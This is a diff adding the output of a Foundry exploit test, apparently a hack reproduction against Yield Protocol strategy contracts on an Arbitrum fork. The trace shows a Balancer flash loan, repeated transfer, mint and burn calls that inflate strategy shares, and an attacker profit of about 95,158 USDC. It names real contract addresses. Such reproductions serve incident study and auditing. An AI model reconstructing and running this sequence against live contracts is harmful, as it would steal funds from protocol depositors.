@@ -1,0 +1,189 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Yield_exp.sol:Yield
+[PASS] testExploit() (gas: 317547)
+Logs:
+   Attacker USDC Balance After exploit: 95158.562521
+
+Traces:
+  [17033] Yield::setUp()
+    ├─ [0] VM::createSelectFork("arbitrum", 206219811 [2.062e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], "YieldStrategy_1")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], "YieldStrategy_2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], "Balancer")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], "USDC")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [402199] Yield::testExploit()
+    ├─ [383902] Balancer::flashLoan(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], [400000000000 [4e11]], 0x)
+    │   ├─ [9796] USDC::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
+    │   │   │   └─ ← [Return] 1889140809178 [1.889e12]
+    │   │   └─ ← [Return] 1889140809178 [1.889e12]
+    │   ├─ [2350] ProtocolFeesCollector::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [35397] USDC::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000 [4e11])
+    │   │   ├─ [34651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000 [4e11]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 400000000000 [4e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x0000000000000000000000000000000000000000000000000000005d21dba000
+    │   │   │   │   @ 0x8e136277087394ae84bd88b3538db688c3763bf01dc7ed78e5235dc311d5959c: 0x000000000000000000000000000000000000000000000000000001b7d9911dda → 0x0000000000000000000000000000000000000000000000000000015ab7b57dda
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [314634] Yield::receiveFlashLoan([0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], [400000000000 [4e11]], [0], 0x)
+    │   │   ├─ [11497] USDC::transfer(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], 308000000000 [3.08e11])
+    │   │   │   ├─ [10751] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], 308000000000 [3.08e11]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], value: 308000000000 [3.08e11])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x7b40ee551f143e177484bc01a17219395f87188a9a9affc7f1fed03dc0a7b058: 0x000000000000000000000000000000000000000000000000000000162c5914e3 → 0x0000000000000000000000000000000000000000000000000000005de2941ce3
+    │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000000000005d21dba000 → 0x000000000000000000000000000000000000000000000000000000156ba09800
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [49368] YieldStrategy_1::mintDivested(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [1296] USDC::balanceOf(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa]) [staticcall]
+    │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 403233316067 [4.032e11]
+    │   │   │   │   └─ ← [Return] 403233316067 [4.032e11]
+    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 307649973574 [3.076e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 14: 0x000000000000000000000000000000000000000000000000000000162c5914e3 → 0x0000000000000000000000000000000000000000000000000000005de2941ce3
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x00000000000000000000000000000000000000000000000000000047a15e0d46
+    │   │   │   │   @ 1: 0x0000000000000000000000000000000000000000000000000000001625e5a7db → 0x0000000000000000000000000000000000000000000000000000005dc743b521
+    │   │   │   └─ ← [Return] 307649973574 [3.076e11]
+    │   │   ├─ [643] YieldStrategy_1::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 307649973574 [3.076e11]
+    │   │   ├─ [17631] YieldStrategy_1::transfer(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], 153824986787 [1.538e11])
+    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 153824986787 [1.538e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0x00000000000000000000000000000000000000000000000000000016257815f3 → 0x00000000000000000000000000000000000000000000000000000039f6271c96
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x00000000000000000000000000000000000000000000000000000047a15e0d46 → 0x00000000000000000000000000000000000000000000000000000023d0af06a3
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [50939] YieldStrategy_2::mint(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47])
+    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 248942894230 [2.489e11]
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 153782702251 [1.537e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 0x0000000000000000000000000000000000000000000000000000001623e91e62 → 0x00000000000000000000000000000000000000000000000000000039f212ef0d
+    │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0 → 0x00000000000000000000000000000000000000000000000000000023ce29d0ab
+    │   │   │   │   @ 16: 0x00000000000000000000000000000000000000000000000000000016257815f3 → 0x00000000000000000000000000000000000000000000000000000039f6271c96
+    │   │   │   └─ ← [Return] 153782702251 [1.537e11]
+    │   │   ├─ [643] YieldStrategy_1::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 153824986787 [1.538e11]
+    │   │   ├─ [10831] YieldStrategy_1::transfer(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], 153824986787 [1.538e11])
+    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 153824986787 [1.538e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0x00000000000000000000000000000000000000000000000000000039f6271c96 → 0x0000000000000000000000000000000000000000000000000000005dc6d62339
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x00000000000000000000000000000000000000000000000000000023d0af06a3 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [41503] YieldStrategy_2::burn(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: 0x0000000000000000000000000000000000000000, value: 153782702251 [1.537e11])
+    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 402767881017 [4.027e11]
+    │   │   │   ├─ [30731] YieldStrategy_1::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 248875406415 [2.488e11])
+    │   │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
+    │   │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 248875406415 [2.488e11])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0x0000000000000000000000000000000000000000000000000000005dc6d62339 → 0x00000000000000000000000000000000000000000000000000000023d4b4ceea
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x00000000000000000000000000000000000000000000000000000039f221544f
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0x00000000000000000000000000000000000000000000000000000023ce29d0ab → 0
+    │   │   │   │   @ 1: 0x00000000000000000000000000000000000000000000000000000039f212ef0d → 0x0000000000000000000000000000000000000000000000000000001623e91e62
+    │   │   │   │   @ 16: 0x00000000000000000000000000000000000000000000000000000039f6271c96 → 0x000000000000000000000000000000000000000000000000000000000405c847
+    │   │   │   └─ ← [Return] 248875406415 [2.488e11]
+    │   │   ├─ [32139] YieldStrategy_2::mint(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47])
+    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 153892474602 [1.538e11]
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 216742664421353 [2.167e14])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 16: 0x000000000000000000000000000000000000000000000000000000000405c847 → 0x00000000000000000000000000000000000000000000000000000023d4b4ceea
+    │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0 → 0x0000000000000000000000000000000000000000000000000000c52055853fe9
+    │   │   │   │   @ 1: 0x0000000000000000000000000000000000000000000000000000001623e91e62 → 0x0000000000000000000000000000000000000000000000000000c536796e5e4b
+    │   │   │   └─ ← [Return] 216742664421353 [2.167e14]
+    │   │   ├─ [21603] YieldStrategy_2::burn(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: 0x0000000000000000000000000000000000000000, value: 216742664421353 [2.167e14])
+    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 153892474602 [1.538e11]
+    │   │   │   ├─ [10831] YieldStrategy_1::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 153824986786 [1.538e11])
+    │   │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
+    │   │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
+    │   │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 153824986786 [1.538e11])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x00000000000000000000000000000000000000000000000000000039f221544f → 0x0000000000000000000000000000000000000000000000000000005dc2d05af1
+    │   │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0x00000000000000000000000000000000000000000000000000000023d4b4ceea → 0x000000000000000000000000000000000000000000000000000000000405c848
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 0x0000000000000000000000000000000000000000000000000000c536796e5e4b → 0x0000000000000000000000000000000000000000000000000000001623e91e62
+    │   │   │   │   @ 0x0b3b07749a897608407553ec8831abff6c5be37114f91ba2ada1aabeb3707939: 0x0000000000000000000000000000000000000000000000000000c52055853fe9 → 0
+    │   │   │   │   @ 16: 0x00000000000000000000000000000000000000000000000000000023d4b4ceea → 0x000000000000000000000000000000000000000000000000000000000405c848
+    │   │   │   └─ ← [Return] 153824986786 [1.538e11]
+    │   │   ├─ [643] YieldStrategy_1::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 402700393201 [4.027e11]
+    │   │   ├─ [34731] YieldStrategy_1::transfer(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], 402700393201 [4.027e11])
+    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], value: 402700393201 [4.027e11])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x0000000000000000000000000000000000000000000000000000005dc2d05af1 → 0
+    │   │   │   │   @ 0x20d56bafe93c5245b25264b1d53a04290881538c450c8e1bc5a4ce7a891ca825: 0 → 0x0000000000000000000000000000000000000000000000000000005dc2d05af1
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [14101] YieldStrategy_1::burnDivested(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], : 0, : 0)
+    │   │   │   ├─ emit Transfer(from: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], to: 0x0000000000000000000000000000000000000000, value: 402700393201 [4.027e11])
+    │   │   │   ├─ [4697] USDC::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403158562521 [4.031e11])
+    │   │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403158562521 [4.031e11]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 403158562521 [4.031e11])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x7b40ee551f143e177484bc01a17219395f87188a9a9affc7f1fed03dc0a7b058: 0x0000000000000000000000000000000000000000000000000000005de2941ce3 → 0x000000000000000000000000000000000000000000000000000000000474a60a
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x000000000000000000000000000000000000000000000000000000156ba09800 → 0x0000000000000000000000000000000000000000000000000000007349c00ed9
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 0x0000000000000000000000000000000000000000000000000000005dc743b521 → 0x0000000000000000000000000000000000000000000000000000000004735a30
+    │   │   │   │   @ 14: 0x0000000000000000000000000000000000000000000000000000005de2941ce3 → 0x000000000000000000000000000000000000000000000000000000000474a60a
+    │   │   │   │   @ 0x20d56bafe93c5245b25264b1d53a04290881538c450c8e1bc5a4ce7a891ca825: 0x0000000000000000000000000000000000000000000000000000005dc2d05af1 → 0
+    │   │   │   └─ ← [Return] 403158562521 [4.031e11]
+    │   │   ├─ [4697] USDC::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 400000000000 [4e11])
+    │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 400000000000 [4e11]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 400000000000 [4e11])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x0000000000000000000000000000000000000000000000000000007349c00ed9 → 0x0000000000000000000000000000000000000000000000000000001627e46ed9
+    │   │   │   │   │   @ 0x8e136277087394ae84bd88b3538db688c3763bf01dc7ed78e5235dc311d5959c: 0x0000000000000000000000000000000000000000000000000000015ab7b57dda → 0x000000000000000000000000000000000000000000000000000001b7d9911dda
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [1296] USDC::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
+    │   │   │   └─ ← [Return] 1889140809178 [1.889e12]
+    │   │   └─ ← [Return] 1889140809178 [1.889e12]
+    │   ├─ emit FlashLoan(recipient: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], token: USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], amount: 400000000000 [4e11], feeAmount: 0)
+    │   └─ ← [Stop]
+    ├─ [1296] USDC::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 95158562521 [9.515e10]
+    │   └─ ← [Return] 95158562521 [9.515e10]
+    ├─ [3121] USDC::decimals() [staticcall]
+    │   ├─ [2381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: " Attacker USDC Balance After exploit", val: 95158562521 [9.515e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.44s (9.09s CPU time)
+
+Ran 1 test suite in 12.84s (10.44s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
